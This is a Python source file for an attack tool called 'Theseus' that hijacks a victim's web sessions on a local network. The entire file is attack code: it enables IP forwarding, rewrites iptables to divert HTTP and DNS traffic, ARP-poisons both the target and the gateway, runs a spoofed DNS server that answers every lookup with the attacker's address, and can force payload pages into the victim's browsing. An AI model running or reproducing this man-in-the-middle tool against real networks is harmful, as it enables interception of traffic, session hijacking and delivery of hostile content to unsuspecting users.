import os
import re
import sys
import socket
import argparse
import threading
import multiprocessing
from arp.arp import Arp_Spoof
from logger.logger import Logger
from arp.ping import Arp_Ping
from banner.banner import New_Banner
from server.server import HTTP_Server
from dns.dns import Decode_Packet, DNS_Server

class Theseus(object):
	"""Theseus Control A Victims Web Sessions"""
	def __init__(self):
		global args, arp, http_Server, ssl_Server, local, router, verbose, html_file, cfg, bhttp, bssl, payloads_folder, log, tm
		super(Theseus, self).__init__()
		log = Logger()

		ap = argparse.ArgumentParser(description="Theseus", add_help=True)
		ap.add_argument("--target", help="This is the targets ip address", required=True)
		ap.add_argument("--iface", help="This is the network cards current interface", required=True)
		ap.add_argument("--gateway", help="This is the routers ip address", required=True)
		ap.add_argument("--verbose", help="This is the time interval between the arp packets", required=False)
		ap.add_argument("--target-mac", help="This is the targets mac address", required=False)
		ap.add_argument('--arp-ping', action='store_const', const=sum, help='This will get the targets mac address via a discret arp ping')
		ap.add_argument('--force-content', action='store_const', const=sum, help='This option will force a custom website into each session')
		ap.add_argument("--spoof", help="Type of spoof (arp)", required=True)
		args = ap.parse_args()

		log.status("Configuring iptables")
		#Configure kernal and iptables for the attack, change echo value to 0 if doesn't work
		os.popen("{ echo 1 > /proc/sys/net/ipv4/ip_forward;\
					iptables --flush;\
					iptables --flush -t nat;\
					iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000;\
					iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 5000; }") #Changed IP Forwarding

		# Load Setting From Config file
		local = os.popen('ifconfig | grep -Eo \'inet (addr:)?([0-9]*\.){3}[0-9]*\' | grep -Eo \'([0-9]*\.){3}[0-9]*\' | grep -v \'127.0.0.1\'').read().strip('\n')
		payloads_folder = 'server/Payloads'
		verbose = 5

		#Handle any possable errors from args
		try:
			int(verbose)
		except ValueError:
			print("\033[1;31mTime must be whole number\033[00m")
			exit()
		try:
			socket.inet_aton(args.target)
			socket.inet_aton(args.gateway)
		except socket.error:
			print("\033[1;31mIncorrect IP address\033[00m")
			exit()
		
		if args.target_mac:
			if re.match("[0-9a-f]{2}([-:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", args.target_mac) != None:
				tm = args.target_mac
				pass
			else:
				print("\033[1;31mInvalid mac address\033[00m")
				tm = None
				exit()
		else: 
			pass


	def dns_spoof(self, dns, *args):
		redirect_ip = args[0]
		while True:
			raw, addr = dns.await_responce()
			dns.send_reply(addr, raw, redirect_ip)

	def attack_dns_spoof(self):
		dns = DNS_Server(local)
		jobs = []
		for i in range(4):
	   		p = multiprocessing.Process(target=self.dns_spoof, args=(dns, local))
	   		jobs.append(p)
	   		p.start()


	def arp_spoof(self, tm):
			arp = Arp_Spoof(args.iface)
			try:
				log.status("{} ({}) is at {}".format(socket.gethostbyaddr(args.target)[0], args.target, tm))
			except socket.herror:
				log.warn("{} is at {}".format(args.target, tm))

			ajobs = []
			victim_thread = multiprocessing.Process(target=arp.poison_victim, args=(args.target, args.gateway, int(verbose), args.iface, tm))
			ajobs.append(victim_thread)
			victim_thread.start()
			try:
				vname = socket.gethostbyaddr(args.target)[0]
				vname = vname.replace('.home', " ")
				log.status("Started attack on {}".format(vname))
			except socket.herror:
				log.warn("Started attack on {}".format(args.target))

			target_thread = multiprocessing.Process(target=arp.poison_router, args=(args.gateway, args.target, int(verbose), args.iface, tm))
			ajobs.append(victim_thread)
			target_thread.start()
			try:
				rname = socket.gethostbyaddr(args.gateway)[0]
				rname = rname.replace('.home', " ")
				log.status("Started attack on {}".format(rname))
			except socket.herror:
				log.warn("Started attack on {}".format(args.target))

	def arp_ping(self):
		p = Arp_Ping(args.iface)
		p.ping(args.target, local, args.iface)
		while True:
			tm = p.await_responce(args.iface)
			try:
				if len(tm) != 0:
					break
			except TypeError: pass
		return tm[0]

	def force_content(self):
		http_Server = HTTP_Server(local, payloads_folder)
		log.status("Started HTTP server on port 9000\n")

		jobs = []
		for i in range(4):
	   		p = multiprocessing.Process(target=http_Server._http_client_handler, args=(payloads_folder))
	   		jobs.append(p)
	   		p.start()

if __name__ == '__main__':
	b = New_Banner()
	print("\033[1;3m"+b.new()+"\033[00m")
	t = Theseus()

	t.attack_dns_spoof()
	log.status("Started DNS server")

	if args.arp_ping:
		log.status("Sending arp ping to {}".format(args.target))
		tm = t.arp_ping()

	if 'arp' in args.spoof:
		t.arp_spoof(tm)

	if args.force_content:
		t.force_content()
